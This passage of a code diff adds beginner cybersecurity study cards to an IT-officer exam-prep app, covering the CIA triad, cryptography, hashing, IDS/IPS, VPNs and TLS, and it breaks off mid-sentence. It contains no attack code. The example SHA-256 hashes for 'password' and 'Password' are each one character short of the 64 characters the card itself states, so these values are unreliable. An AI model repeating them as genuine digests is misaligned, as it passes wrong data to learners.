@@ -18,7 +18,7 @@ export interface ITOfficerConcept {
   tags: string[];
 }
 
-export const IT_OFFICER_SECTIONS = ["Computer Fundamentals", "Programming", "Data Structures & Algorithms", "Database Management System", "Operating Systems", "Computer Networks", "Software Engineering", "Web Technology"] as const;
+export const IT_OFFICER_SECTIONS = ["Computer Fundamentals", "Programming", "Data Structures & Algorithms", "Database Management System", "Operating Systems", "Computer Networks", "Software Engineering", "Web Technology", "Cyber Security"] as const;
 
 export const IT_OFFICER_CONCEPTS: ITOfficerConcept[] = [
   // ─────────────────────────────────────────────
@@ -4772,6 +4772,396 @@ export const IT_OFFICER_CONCEPTS: ITOfficerConcept[] = [
       "// Token-based (JWT) authentication — a typical request\nfetch(\"/api/profile\", {\n  headers: {\n    Authorization: \"Bearer eyJhbGciOiJIUzI1NiIs...\",  // signed token proving identity\n  },\n});\n\n// Server verifies the token's signature — no session lookup needed",
     codeLanguage: "JavaScript",
     tags: ["Authentication", "Authorization", "JWT", "OAuth", "MFA", "Web Concepts"],
+  },
+  // ─────────────────────────────────────────────
+  // CYBER SECURITY
+  // ─────────────────────────────────────────────
+  {
+    id: 311,
+    slug: "fundamentals",
+    section: "Cyber Security",
+    title: "Fundamentals",
+    tagline: "What cybersecurity actually protects, built on one foundational model: the CIA Triad",
+    description:
+      "<b>What This Covers</b>\nFundamentals introduces cybersecurity itself and the single most important model underlying almost everything else in this whole section — the CIA Triad, the three properties that every security control, technology, and defense ultimately exists to protect.\n\n<b>What Cybersecurity Is, in Plain English</b>\nCybersecurity is the practice of protecting computer systems, networks, and data from unauthorized access, damage, disruption, or theft — every topic covered later in this section (cryptography, firewalls, VPNs, specific attacks) is really just one piece of that broader goal, either a tool used to defend something, or a threat being defended against.\n\n<b>What You'll Learn Here</b>\n• <b>CIA Triad</b> — Confidentiality, Integrity, and Availability: the three core properties every security measure is ultimately trying to protect\n  ↳ Nearly every other topic in this section maps back to one (or more) of these three — encryption protects confidentiality, hashing protects integrity, a firewall protects availability from certain attacks, and so on.",
+    note:
+      "Exam favourite: whenever a security scenario or technology is described, ask which of the three CIA properties it's actually protecting — this single lens is the fastest way to classify almost any cybersecurity concept in this entire section.",
+    diagram:
+      "  CYBERSECURITY — everything maps back to the CIA Triad\n\n            Confidentiality\n                 /\\\n                /  \\\n               /    \\\n     Integrity ────── Availability\n\n  Every tool, attack, and defense in this section protects\n  (or threatens) one or more of these three properties.",
+    tags: ["Cybersecurity", "Fundamentals", "CIA Triad"],
+  },
+  {
+    id: 312,
+    slug: "cia-triad",
+    section: "Cyber Security",
+    parentSlug: "fundamentals",
+    title: "CIA Triad",
+    tagline: "Confidentiality, Integrity, and Availability — the three core properties security is built to protect",
+    description:
+      "<b>What the CIA Triad Is, in Plain English</b>\nThe CIA Triad is the foundational model of information security, naming the three properties a secure system must protect: Confidentiality (keeping data secret from unauthorized parties), Integrity (keeping data accurate and untampered), and Availability (keeping data and systems accessible to those who legitimately need them).\n\n<b>The Three Properties, at a Glance</b>\n• <b>Confidentiality</b> — only authorized people can see the data\n• <b>Integrity</b> — the data is accurate and hasn't been tampered with\n• <b>Availability</b> — the data and systems are accessible when legitimately needed\n  ↳ Each is covered in full in its own card next.\n\n<b>Why All Three Matter Together</b>\nA system can fail security in any one of these three ways independently — data can be stolen (a confidentiality failure) without being changed at all, data can be silently altered (an integrity failure) without anyone unauthorized ever reading it, and a system can be knocked offline (an availability failure) without any data being read or changed at all. A complete security strategy has to address all three, not just one.\n\n<b>Real-World Example — A Bank's Online Banking System</b>\n• Confidentiality: encrypting a customer's account balance so only that customer can see it\n• Integrity: making sure no one can secretly change a transaction amount after it's recorded\n• Availability: making sure the banking app stays online and accessible even during a surge of traffic or an attempted attack",
+    note:
+      "Exam favourite: for any described security incident, identify which leg (or legs) of the CIA Triad were actually violated — a data leak is a confidentiality failure, a tampered record is an integrity failure, a service outage is an availability failure.",
+    diagram:
+      "  THE CIA TRIAD\n\n              ┌────────────────┐\n              │ Confidentiality │  only authorized parties can see it\n              └────────────────┘\n         ┌────────────┐   ┌────────────┐\n         │  Integrity  │   │ Availability │\n         └────────────┘   └────────────┘\n         data is accurate    accessible when\n         and untampered      legitimately needed",
+    tags: ["CIA Triad", "Confidentiality", "Integrity", "Availability", "Cybersecurity"],
+  },
+  {
+    id: 313,
+    slug: "confidentiality",
+    section: "Cyber Security",
+    parentSlug: "cia-triad",
+    title: "Confidentiality",
+    tagline: "Ensuring only authorized people or systems can actually see the data",
+    description:
+      "<b>What Confidentiality Is, in Plain English</b>\nConfidentiality means making sure that data is only accessible to the people and systems explicitly authorized to see it — anyone else, including an attacker who intercepts the data in transit or steals a copy of it, should find it unreadable or inaccessible.\n\n<b>How Confidentiality Is Protected</b>\n• <b>Encryption</b> — scrambling data so that even if it's intercepted or stolen, it can't be read without the correct decryption key (covered in full in the Cryptography chapter)\n• <b>Access control</b> — restricting who can view specific data based on their identity and permissions, so even authorized users of a system only see what they specifically need to\n• <b>Authentication</b> — verifying a user's identity before granting them access to confidential data in the first place (covered in the Web Technology section)\n\n<b>Real-World Example</b>\nWhen you log into your email over HTTPS, the connection is encrypted (protecting confidentiality) so that anyone intercepting your Wi-Fi traffic at a coffee shop sees only scrambled data, not your actual emails or password in plain text.\n\n<b>What a Confidentiality Failure Looks Like</b>\nA data breach where customer records, passwords, or private messages are stolen and read by an unauthorized party is a textbook confidentiality failure — the data itself might be completely unaltered and the system might still be running fine, but the wrong people were still able to read it.",
+    note:
+      "Exam favourite: confidentiality failures are about unauthorized reading, not unauthorized changing (that's integrity) or unauthorized denial of access (that's availability). A leaked password database is a confidentiality breach even if not a single password was changed.",
+    diagram:
+      "  CONFIDENTIALITY — only authorized eyes\n\n  Authorized user ──► [ Data ] ──► can read it ✓\n  Attacker        ──► [ Data ] ──► sees only ciphertext / is blocked ✗",
+    tags: ["Confidentiality", "CIA Triad", "Encryption", "Access Control"],
+  },
+  {
+    id: 314,
+    slug: "integrity",
+    section: "Cyber Security",
+    parentSlug: "cia-triad",
+    title: "Integrity",
+    tagline: "Ensuring data stays accurate and hasn't been tampered with, whether by accident or by an attacker",
+    description:
+      "<b>What Integrity Is, in Plain English</b>\nIntegrity means making sure data remains accurate, consistent, and unaltered from its original, trusted state — whether it's being stored, processed, or sent across a network — and that any unauthorized change to it can be detected.\n\n<b>How Integrity Is Protected</b>\n• <b>Hashing</b> — generating a fixed-size digital 'fingerprint' of a piece of data; if even a single bit of the original data changes, the hash changes completely, making tampering immediately detectable (covered in full in the Cryptography chapter)\n• <b>Checksums</b> — a simpler form of the same idea, commonly used to verify a downloaded file wasn't corrupted or altered in transit\n• <b>Digital signatures</b> — combine hashing with asymmetric encryption to prove both that data hasn't been altered and that it genuinely came from the claimed sender\n\n<b>Real-World Example</b>\nWhen you download software, the provider often publishes a SHA-256 checksum alongside it. After downloading, you can hash the file yourself and compare it to the published value — if they match, the file arrived exactly as intended; if they differ, the file was corrupted or tampered with somewhere along the way.\n\n<b>What an Integrity Failure Looks Like</b>\nAn attacker secretly changing a bank transaction's amount, or silently modifying a software update before it reaches users, are both integrity failures — the data (or file) was never necessarily hidden from anyone (confidentiality could still be intact), but what it actually said or did was tampered with.",
+    note:
+      "Exam favourite: integrity is about unauthorized change, not unauthorized reading (confidentiality) or unauthorized denial of access (availability). Hashing is the go-to mechanism examiners expect for verifying integrity, since it's specifically designed to detect even a single-bit change.",
+    diagram:
+      "  INTEGRITY — detecting any tampering\n\n  Original file ──► hash() ──► fingerprint: a1b2c3...\n\n  Later, re-check:\n  Received file ──► hash() ──► fingerprint: a1b2c3...   → MATCH: untampered\n  Tampered file ──► hash() ──► fingerprint: 9f8e7d...   → MISMATCH: tampering detected",
+    tags: ["Integrity", "CIA Triad", "Hashing", "Checksums", "Digital Signatures"],
+  },
+  {
+    id: 315,
+    slug: "availability",
+    section: "Cyber Security",
+    parentSlug: "cia-triad",
+    title: "Availability",
+    tagline: "Ensuring systems and data stay accessible to authorized users whenever they're legitimately needed",
+    description:
+      "<b>What Availability Is, in Plain English</b>\nAvailability means making sure systems, services, and data remain accessible and usable by authorized users whenever they're legitimately needed — a perfectly confidential, perfectly accurate system is still a security failure if it's down and unreachable right when someone actually needs it.\n\n<b>How Availability Is Protected</b>\n• <b>Redundancy</b> — running multiple copies of critical systems (extra servers, multiple data centers) so if one fails, another can take over without the whole service going down\n• <b>Backups</b> — keeping separate, restorable copies of data, so if the primary copy is lost, corrupted, or held hostage (as in a ransomware attack), it can still be recovered\n• <b>DDoS mitigation</b> — specialized defenses (traffic filtering, rate limiting, distributing load across many servers) that detect and absorb a flood of malicious traffic aimed at knocking a service offline\n\n<b>The Classic Threat to Availability — DDoS Attacks</b>\nA Distributed Denial-of-Service (DDoS) attack floods a server with an overwhelming volume of traffic from many different sources at once, exhausting its resources until it can no longer respond to legitimate users — a direct, deliberate attack on availability specifically, without necessarily reading or altering any data at all.\n\n<b>Real-World Example</b>\nAn e-commerce site going down during a major sale because attackers flooded it with fake traffic is a pure availability failure — no customer data was stolen (confidentiality intact) or altered (integrity intact), but legitimate customers simply couldn't reach the site to shop.",
+    note:
+      "Exam favourite: availability failures are about denying legitimate access, not stealing (confidentiality) or altering (integrity) data. A DDoS attack is the textbook example examiners expect when a scenario describes a service going down under a flood of traffic.",
+    diagram:
+      "  AVAILABILITY — kept accessible, even under attack\n\n  Legitimate users ──► [ Service ] ──► normally reachable ✓\n\n  DDoS attack floods the service with fake traffic:\n  Legitimate users ──► [ Service: overwhelmed ] ──► can't get through ✗\n  Mitigation (redundancy, filtering, rate limiting) restores access",
+    tags: ["Availability", "CIA Triad", "DDoS", "Redundancy", "Backups"],
+  },
+  {
+    id: 316,
+    slug: "cryptography",
+    section: "Cyber Security",
+    title: "Cryptography",
+    tagline: "The science of protecting data using mathematical techniques — encryption, decryption, and hashing",
+    description:
+      "<b>What This Covers</b>\nCryptography covers the mathematical techniques used to protect data's confidentiality and integrity — turning readable data into something unreadable to anyone without the right key, and generating tamper-evident fingerprints of data.\n\n<b>What You'll Learn Here</b>\n• <b>Encryption</b> — converting readable data (plaintext) into unreadable data (ciphertext)\n• <b>Decryption</b> — reversing encryption, turning ciphertext back into plaintext\n• <b>Symmetric Encryption</b> — using the same key to both encrypt and decrypt\n• <b>Asymmetric Encryption</b> — using a mathematically linked pair of keys (public and private) instead of one shared key\n• <b>Hashing</b> — a one-way function that produces a fixed-size fingerprint of data, and cannot be reversed back to the original\n  ↳ These build on each other: Encryption and Decryption are the two directions of the same core process, Symmetric and Asymmetric are two different approaches to how that process manages its keys, and Hashing is a related but fundamentally different tool, since it's deliberately irreversible.",
+    note:
+      "Exam favourite: the single biggest conceptual trap in this chapter is confusing encryption with hashing — encryption is reversible (given the right key); hashing is deliberately one-way and can never be reversed back to the original data.",
+    diagram:
+      "  CRYPTOGRAPHY — the core building blocks\n\n  Encryption   ◄──►   Decryption      (reversible, with the right key)\n  Symmetric (1 shared key)  vs  Asymmetric (public/private key pair)\n  Hashing  →  fixed fingerprint, NEVER reversible back to the original",
+    tags: ["Cryptography", "Encryption", "Decryption", "Symmetric Encryption", "Asymmetric Encryption", "Hashing"],
+  },
+  {
+    id: 317,
+    slug: "encryption",
+    section: "Cyber Security",
+    parentSlug: "cryptography",
+    title: "Encryption",
+    tagline: "Converting readable data (plaintext) into unreadable data (ciphertext) using an algorithm and a key",
+    description:
+      "<b>What Encryption Is, in Plain English</b>\nEncryption is the process of converting readable data (called plaintext) into scrambled, unreadable data (called ciphertext), using a mathematical algorithm combined with a secret key — anyone without the correct key sees only meaningless ciphertext, protecting the data's confidentiality even if it's intercepted or stolen.\n\n<b>The Two Ingredients — Algorithm and Key</b>\n• <b>Algorithm</b> — the mathematical procedure used to scramble the data (e.g. AES, RSA); the algorithm itself is usually publicly known and standardized\n• <b>Key</b> — the specific secret value fed into the algorithm alongside the data; the security of encrypted data depends entirely on keeping the key secret, not on keeping the algorithm secret\n  ↳ This is a core principle in cryptography: a well-designed encryption system stays secure even if an attacker knows exactly which algorithm was used, as long as they don't have the key.\n\n<b>Where Encryption Is Used</b>\n• <b>Data in transit</b> — encrypting data as it travels across a network (e.g. HTTPS/TLS encrypting web traffic)\n• <b>Data at rest</b> — encrypting data while it's stored on a disk, so it's unreadable even if the physical storage device is stolen\n\n<b>Two Approaches, Covered Next</b>\nEncryption comes in two major forms based on how keys are managed — Symmetric Encryption (one shared key) and Asymmetric Encryption (a public/private key pair) — each covered in its own card next.",
+    note:
+      "Exam favourite: a system's security should never depend on keeping its algorithm secret — only the key needs to be kept secret. This principle (Kerckhoffs's principle) is a frequently tested concept in cryptography.",
+    diagram:
+      "  ENCRYPTION — plaintext becomes ciphertext\n\n  Plaintext: \"Hello, world\"\n       │\n       ▼  encrypt with algorithm + key\n  Ciphertext: \"8f3a9c2e1b7d4f...\"  ← meaningless without the key",
+    tags: ["Encryption", "Cryptography", "Plaintext", "Ciphertext"],
+  },
+  {
+    id: 318,
+    slug: "decryption",
+    section: "Cyber Security",
+    parentSlug: "cryptography",
+    title: "Decryption",
+    tagline: "Reversing encryption — turning ciphertext back into its original, readable plaintext using the correct key",
+    description:
+      "<b>What Decryption Is, in Plain English</b>\nDecryption is the reverse of encryption — taking scrambled, unreadable ciphertext and converting it back into its original, readable plaintext, using the same algorithm and the correct decryption key. Only someone with the right key can successfully perform this reversal; anyone else attempting it without the key gets nothing usable back.\n\n<b>Why the Key Matters So Much</b>\nThe entire security of an encrypted message rests on decryption being computationally infeasible without the correct key — a well-designed algorithm makes guessing the key (a 'brute-force attack') so slow, even for the fastest computers, that it would take an impractically long time to succeed, even though the algorithm itself is fully public knowledge.\n\n<b>Decryption in Symmetric vs. Asymmetric Systems</b>\n• In symmetric encryption, decryption uses the exact same key that was used to encrypt\n• In asymmetric encryption, decryption uses the mathematically paired key (if data was encrypted with someone's public key, only their matching private key can decrypt it)\n  ↳ Both are covered in full in their own cards next.\n\n<b>Real-World Example</b>\nWhen your browser receives encrypted data from an HTTPS website, it uses a key (established during the connection's TLS handshake) to decrypt that data back into the readable webpage content you actually see — all happening automatically, in milliseconds, without you noticing.",
+    note:
+      "Exam favourite: decryption always requires the correct key that matches how the data was encrypted — in symmetric systems that's the identical shared key, in asymmetric systems that's the paired private (or public) key, never just 'knowing the algorithm.'",
+    diagram:
+      "  DECRYPTION — ciphertext back to plaintext\n\n  Ciphertext: \"8f3a9c2e1b7d4f...\"\n       │\n       ▼  decrypt with algorithm + correct key\n  Plaintext: \"Hello, world\"\n\n  Wrong key or no key at all → decryption fails, output stays gibberish",
+    tags: ["Decryption", "Cryptography", "Ciphertext", "Plaintext"],
+  },
+  {
+    id: 319,
+    slug: "symmetric-encryption",
+    section: "Cyber Security",
+    parentSlug: "cryptography",
+    title: "Symmetric Encryption",
+    tagline: "The same single key both encrypts and decrypts — fast, but the key must somehow be shared securely first",
+    description:
+      "<b>What Symmetric Encryption Is, in Plain English</b>\nSymmetric encryption uses the exact same key to both encrypt and decrypt data — whoever holds that one shared key can both scramble the data and unscramble it again, which means both the sender and receiver must have a copy of the identical key before secure communication can happen.\n\n<b>Why It's Fast</b>\nSymmetric algorithms (like AES, the Advanced Encryption Standard) are computationally simple compared to asymmetric algorithms, making symmetric encryption significantly faster — this is why it's the preferred choice for encrypting large amounts of data, like an entire file or a continuous stream of network traffic.\n\n<b>The Key Distribution Problem</b>\nSymmetric encryption's biggest challenge isn't the encryption itself — it's securely getting the shared key to the other party in the first place. If the key is intercepted while being shared, an attacker who has it can decrypt everything encrypted with it, completely defeating the purpose.\n  ↳ This exact problem is why asymmetric encryption exists — it solves key distribution, at the cost of being much slower, which is why real systems often use both together (asymmetric encryption to securely exchange a symmetric key, then symmetric encryption for the actual bulk data, exactly how HTTPS/TLS works).\n\n<b>Real-World Example</b>\nAES (Advanced Encryption Standard) is the most widely used symmetric algorithm today, used to encrypt everything from Wi-Fi traffic (WPA2/WPA3) to files on an encrypted hard drive.",
+    note:
+      "Exam favourite: symmetric encryption's core trade-off is speed vs. key distribution — it's fast, but both parties need the same secret key beforehand, and securely sharing that key over an insecure channel is the hard part.",
+    diagram:
+      "  SYMMETRIC ENCRYPTION — ONE shared key, both directions\n\n  Alice: plaintext ──encrypt with KEY──► ciphertext ──sends──►\n                                                              Bob: ciphertext ──decrypt with SAME KEY──► plaintext\n\n  Both Alice and Bob must already have the identical secret KEY.",
+    code:
+      "// Symmetric encryption — the SAME key encrypts and decrypts (conceptual)\nconst key = generateSharedKey();\n\nconst ciphertext = encryptAES(\"Hello, world\", key);\nconst plaintext  = decryptAES(ciphertext, key);   // same key used both ways\n\nconsole.log(plaintext); // \"Hello, world\"",
+    codeLanguage: "JavaScript",
+    tags: ["Symmetric Encryption", "Cryptography", "AES", "Key Distribution"],
+  },
+  {
+    id: 320,
+    slug: "asymmetric-encryption",
+    section: "Cyber Security",
+    parentSlug: "cryptography",
+    title: "Asymmetric Encryption",
+    tagline: "A public/private key pair, instead of one shared secret — solves key distribution, at the cost of speed",
+    description:
+      "<b>What Asymmetric Encryption Is, in Plain English</b>\nAsymmetric encryption (also called public-key encryption) uses a mathematically linked pair of keys instead of one shared key: a public key, which can be freely shared with anyone, and a private key, which must be kept completely secret by its owner. Data encrypted with someone's public key can only be decrypted with their matching private key — not even the original sender can decrypt it again with the public key alone.\n\n<b>How It Solves Symmetric Encryption's Key Distribution Problem</b>\nSince the public key doesn't need to be kept secret at all, it can be shared openly, even over an insecure channel, without weakening security — anyone can use it to encrypt a message meant for its owner, but only the owner's private key can decrypt it. This completely sidesteps the 'how do we securely share a secret key first' problem that symmetric encryption struggles with.\n\n<b>Why It's Slower</b>\nAsymmetric algorithms (like RSA) rely on much more computationally expensive mathematics than symmetric algorithms, making them significantly slower — which is why asymmetric encryption is typically used only for small amounts of data (like exchanging a symmetric key, or creating a digital signature), not for encrypting large files or continuous data streams directly.\n\n<b>Real-World Example</b>\nDuring a TLS handshake (when your browser connects to an HTTPS website), asymmetric encryption is used briefly to securely exchange a symmetric session key — after that, the much faster symmetric encryption takes over for the actual page data, combining both approaches' strengths.",
+    note:
+      "Exam favourite: asymmetric encryption uses two mathematically linked keys (public + private) instead of one shared key, solving the key distribution problem symmetric encryption has — but it's much slower, so real systems (like HTTPS) typically use it only briefly, to exchange a symmetric key, then switch to symmetric encryption for the actual data.",
+    diagram:
+      "  ASYMMETRIC ENCRYPTION — public/private key pair\n\n  Bob's Public Key  (shared openly, anyone can have it)\n  Bob's Private Key (kept secret, only Bob has it)\n\n  Alice: plaintext ──encrypt with Bob's PUBLIC key──► ciphertext ──sends──►\n                                                                        Bob: ciphertext ──decrypt with Bob's PRIVATE key──► plaintext\n\n  Only Bob's private key can decrypt something encrypted with Bob's public key.",
+    tags: ["Asymmetric Encryption", "Cryptography", "RSA", "Public Key", "Private Key"],
+  },
+  {
+    id: 321,
+    slug: "hashing",
+    section: "Cyber Security",
+    parentSlug: "cryptography",
+    title: "Hashing",
+    tagline: "A one-way function that turns data into a fixed-size fingerprint — deliberately impossible to reverse",
+    description:
+      "<b>What Hashing Is, in Plain English</b>\nHashing takes data of any size and runs it through a hash function to produce a fixed-size output called a hash (or digest) — unlike encryption, hashing is deliberately one-way: there is no key that can turn a hash back into the original data, by design.\n\n<b>Why Hashing Is One-Way (Unlike Encryption)</b>\nEncryption is meant to be reversible by someone with the right key; hashing is meant to never be reversible at all, by anyone. This makes hashing perfect for situations where you only ever need to verify or compare data, never actually recover the original from the hash itself.\n\n<b>Two Major Uses of Hashing</b>\n• <b>Integrity verification</b> — hashing a file and comparing the result to a previously known hash reveals whether the file has been altered at all, even by a single bit (covered in the Integrity card)\n• <b>Password storage</b> — instead of storing a user's actual password, a system stores only its hash; when the user logs in, the system hashes whatever they typed and compares it to the stored hash, so even if the password database is stolen, the actual passwords are never directly exposed\n\n<b>Key Properties of a Good Hash Function</b>\n• <b>Deterministic</b> — the same input always produces the exact same hash\n• <b>Fixed-size output</b> — regardless of input size (a single word or an entire movie file), the hash is always the same length\n• <b>Avalanche effect</b> — changing even a single bit of the input produces a completely different, unrelated-looking hash\n• <b>Collision-resistant</b> — it should be extremely difficult to find two different inputs that produce the same hash\n\n<b>Real-World Example</b>\nSHA-256 is a widely used hash algorithm — hashing the word \"password\" always produces the exact same 64-character hexadecimal string every time, but hashing \"Password\" (just one capital letter different) produces a completely unrelated-looking hash.",
+    note:
+      "Exam favourite: hashing is one-way and can NEVER be reversed back to the original input — this is the single biggest distinction from encryption, which is designed specifically to be reversible with the correct key.",
+    diagram:
+      "  HASHING — one-way, fixed-size fingerprint\n\n  \"password\"  ──SHA-256──►  5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d\n  \"Password\"  ──SHA-256──►  e7cf3ef4f17c3999a94f2c6f612e8a888e5b1026878e4e19398b23bd38ec221\n\n  One character different → completely different hash (avalanche effect)\n  No key can reverse either hash back to the original word.",
+    code:
+      "// Password verification using hashing — never store the raw password\nconst storedHash = \"5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d\";\n\nfunction login(enteredPassword) {\n  const enteredHash = sha256(enteredPassword);\n  return enteredHash === storedHash;  // compare hashes, never the raw password\n}",
+    codeLanguage: "JavaScript",
+    tags: ["Hashing", "Cryptography", "SHA-256", "Password Storage", "One-Way Function"],
+  },
+  {
+    id: 322,
+    slug: "security-technologies",
+    section: "Cyber Security",
+    crossLinkSlugs: ["firewall-device"],
+    title: "Security Technologies",
+    tagline: "The actual tools used to defend networks and data — Firewall, IDS, IPS, VPN, and SSL/TLS",
+    description:
+      "<b>What This Covers</b>\nSecurity Technologies covers the concrete tools organizations deploy to actually defend their networks and data — some watch for threats, some actively block them, and some protect data as it travels across untrusted networks.\n\n<b>What You'll Learn Here</b>\n• <b>Firewall</b> — filters network traffic based on security rules (covered in full in the Networking Devices chapter, since it's also a core networking device)\n• <b>IDS</b> — Intrusion Detection System, monitors and alerts on suspicious activity without blocking it\n• <b>IPS</b> — Intrusion Prevention System, actively blocks detected threats in real time\n• <b>VPN</b> — Virtual Private Network, creates an encrypted tunnel over a public network\n• <b>SSL/TLS</b> — cryptographic protocols that secure data as it travels between a client and a server\n  ↳ IDS, VPN, and SSL/TLS are each covered in full in their own card next; Firewall is covered in the Networking Devices chapter, since a firewall's job (filtering traffic) is the same whether you're studying it as a network device or a security tool.",
+    note:
+      "Exam favourite: IDS detects and alerts (a detective control); IPS detects AND blocks (a preventive control). This exact distinction, detect-only vs. detect-and-block, is one of the most frequently tested pairs in this whole chapter.",
+    diagram:
+      "  SECURITY TECHNOLOGIES — detect, prevent, and protect data in transit\n\n  Firewall  → filters traffic by rule (see Networking Devices)\n  IDS       → detects and ALERTS on suspicious activity (passive)\n  IPS       → detects and BLOCKS threats in real time (active)\n  VPN       → encrypted tunnel over a public network\n  SSL/TLS   → encrypts data in transit between client and server",
+    tags: ["Security Technologies", "Firewall", "IDS", "IPS", "VPN", "SSL/TLS"],
+  },
+  {
+    id: 323,
+    slug: "ids-security",
+    section: "Cyber Security",
+    parentSlug: "security-technologies",
+    title: "IDS (Intrusion Detection System)",
+    tagline: "Monitors network or system activity for suspicious behavior and alerts administrators, without blocking it",
+    description:
+      "<b>What an IDS Is, in Plain English</b>\nAn Intrusion Detection System (IDS) monitors network traffic or system activity, looking for signs of an attack or policy violation, and raises an alert when it finds one — but critically, an IDS is a passive, detective control: it observes and reports, it does not block or stop the suspicious activity itself.\n\n<b>How an IDS Detects Threats</b>\n• <b>Signature-based detection</b> — compares observed activity against a database of known attack patterns (signatures); fast and accurate for known threats, but blind to brand-new attacks it has no signature for yet\n• <b>Anomaly-based detection</b> — establishes a baseline of 'normal' behavior, then flags anything that deviates significantly from it; can catch novel attacks, but also more prone to false alarms\n\n<b>Two Placement Types</b>\n• <b>Network-based IDS (NIDS)</b> — monitors traffic across an entire network segment, watching for suspicious patterns in traffic between many devices\n• <b>Host-based IDS (HIDS)</b> — runs on one specific device, monitoring that device's own system files, logs, and processes for signs of compromise\n\n<b>Why 'Detection Only' Still Matters</b>\nEven though an IDS doesn't block anything itself, the alert it raises lets a security team investigate and respond quickly — in many organizations, an IDS's alerts feed directly into a human-monitored security operations process, or trigger an IPS to take action.",
+    note:
+      "Exam favourite: IDS = Detect + Alert ONLY, never blocks traffic itself. This is the single detail that separates it from an IPS, which does everything an IDS does plus actively blocks the threat.",
+    diagram:
+      "  IDS — watches and alerts, never blocks\n\n  Network traffic ──► [ IDS: monitoring ] ──► suspicious pattern found\n                                                        │\n                                                        ▼\n                                              ALERT sent to admin/security team\n                                              (traffic itself is NOT blocked)",
+    tags: ["IDS", "Security Technologies", "Signature-Based Detection", "Anomaly-Based Detection"],
+  },
+  {
+    id: 324,
+    slug: "ips-security",
+    section: "Cyber Security",
+    parentSlug: "security-technologies",
+    title: "IPS (Intrusion Prevention System)",
+    tagline: "Detects suspicious activity just like an IDS, but actively blocks it in real time before it causes harm",
+    description:
+      "<b>What an IPS Is, in Plain English</b>\nAn Intrusion Prevention System (IPS) does everything an IDS does — monitoring traffic for signs of an attack — but goes one step further and actively blocks the malicious traffic in real time, without waiting for a human to respond to an alert. This makes an IPS a preventive control, not just a detective one.\n\n<b>How an IPS Sits in the Network</b>\nAn IPS is typically placed inline, directly in the path of network traffic (unlike a passive IDS, which can simply watch a copy of the traffic from the side) — every packet actually has to pass through the IPS, which lets it drop or block malicious packets before they ever reach their destination.\n\n<b>The Trade-off — Blocking Comes With Risk</b>\nBecause an IPS actively blocks traffic automatically, a false positive (legitimate traffic mistakenly flagged as malicious) can actually disrupt real business traffic — this is a real risk an IDS doesn't carry, since an IDS's false positives only generate an unnecessary alert, never an unwanted block.\n\n<b>IDS vs. IPS, Side by Side</b>\n• IDS: passive, detects and alerts only, sits alongside (not inline with) traffic, no risk of blocking legitimate traffic\n• IPS: active, detects and blocks in real time, sits inline in the traffic path, carries the risk of false positives disrupting legitimate traffic",
+    note:
+      "Exam favourite: IPS = Detect + BLOCK, in real time, sitting inline in the traffic path. If a question describes a system that actually stops an attack automatically (not just alerting someone), that's an IPS, not an IDS.",
+    diagram:
+      "  IPS — detects AND blocks, inline\n\n  Network traffic ──► [ IPS: inline, inspecting every packet ]\n                              │\n                    malicious packet found?\n                        │             │\n                       Yes            No\n                        │             │\n                  BLOCKED/DROPPED   passes through normally",
+    tags: ["IPS", "Security Technologies", "Inline", "Preventive Control"],
+  },
+  {
+    id: 325,
+    slug: "vpn",
+    section: "Cyber Security",
+    parentSlug: "security-technologies",
+    title: "VPN (Virtual Private Network)",
+    tagline: "Creates an encrypted tunnel over a public network, so traffic travels privately even across the open internet",
+    description:
+      "<b>What a VPN Is, in Plain English</b>\nA VPN (Virtual Private Network) creates an encrypted 'tunnel' between a device and a VPN server over an otherwise public, untrusted network (like the internet), making it look and behave as if the device were directly connected to a private network — anyone intercepting the traffic in between only sees encrypted, unreadable data.\n\n<b>How a VPN Works, Step by Step</b>\n1. A device connects to a VPN server, establishing an encrypted tunnel between them\n2. All of the device's network traffic is routed through this tunnel to the VPN server first\n3. The VPN server decrypts the traffic and forwards it on to its actual destination (e.g. a website) on the device's behalf\n4. The response follows the same path back, encrypted through the tunnel again\n\n<b>Common Reasons to Use a VPN</b>\n• <b>Secure remote access</b> — employees connecting to their company's private internal network securely from home or while traveling, as if they were physically in the office\n• <b>Privacy on public networks</b> — protecting traffic from being intercepted on an untrusted public Wi-Fi network (like at a coffee shop or airport)\n• <b>Masking your IP address / location</b> — since traffic appears to originate from the VPN server, not the device's actual location, a VPN can also mask a device's real IP address and apparent location\n\n<b>What a VPN Does Not Protect Against</b>\nA VPN encrypts the traffic between your device and the VPN server, but it doesn't protect against threats already on your device (like malware already installed) or against a website itself being malicious — it protects data in transit, not everything else in the security picture.",
+    note:
+      "Exam favourite: a VPN's core mechanism is an encrypted tunnel over an untrusted network, making a public network behave like a private one — remote access to a company's internal network is the classic exam scenario.",
+    diagram:
+      "  VPN — encrypted tunnel over the public internet\n\n  [Remote Employee's Laptop]\n         │\n         ▼  ══════ ENCRYPTED VPN TUNNEL ══════  (over the public internet)\n         ▼\n  [Company VPN Server] ──► [Company's Private Internal Network]\n\n  Anyone intercepting traffic between the laptop and the VPN server\n  sees only encrypted, unreadable data.",
+    tags: ["VPN", "Security Technologies", "Encrypted Tunnel", "Remote Access"],
+  },
+  {
+    id: 326,
+    slug: "ssl-tls",
+    section: "Cyber Security",
+    parentSlug: "security-technologies",
+    title: "SSL/TLS",
+    tagline: "The cryptographic protocols that encrypt data traveling between a client and a server — the security behind HTTPS",
+    description:
+      "<b>What SSL/TLS Is, in Plain English</b>\nSSL (Secure Sockets Layer) and its modern successor TLS (Transport Layer Security) are cryptographic protocols that establish an encrypted, authenticated connection between a client (like a browser) and a server, protecting data as it travels between them. SSL is now considered obsolete and insecure; TLS is what's actually used today, though the two names are still often used interchangeably in casual conversation (as in 'SSL certificate,' which today virtually always really means a TLS certificate).\n\n<b>What TLS Actually Provides</b>\n• <b>Encryption</b> — data is unreadable to anyone intercepting the connection\n• <b>Authentication</b> — a digital certificate proves the server is genuinely who it claims to be, preventing an attacker from impersonating a trusted site\n• <b>Integrity</b> — TLS detects if data was tampered with in transit\n\n<b>The TLS Handshake, Simplified</b>\n1. The client connects and the server presents its digital certificate, proving its identity\n2. The client verifies the certificate is valid and issued by a trusted authority\n3. Using asymmetric encryption briefly, the client and server securely agree on a shared symmetric session key\n4. From this point on, all data is encrypted using that fast, shared symmetric key — combining asymmetric encryption's secure key exchange with symmetric encryption's speed for the actual data\n\n<b>Where TLS Is Used</b>\nTLS is exactly what makes HTTPS secure (covered in the Web Technology section) — it's also used to secure email transmission, VPN connections, and many other network protocols wherever data needs to travel safely across an untrusted 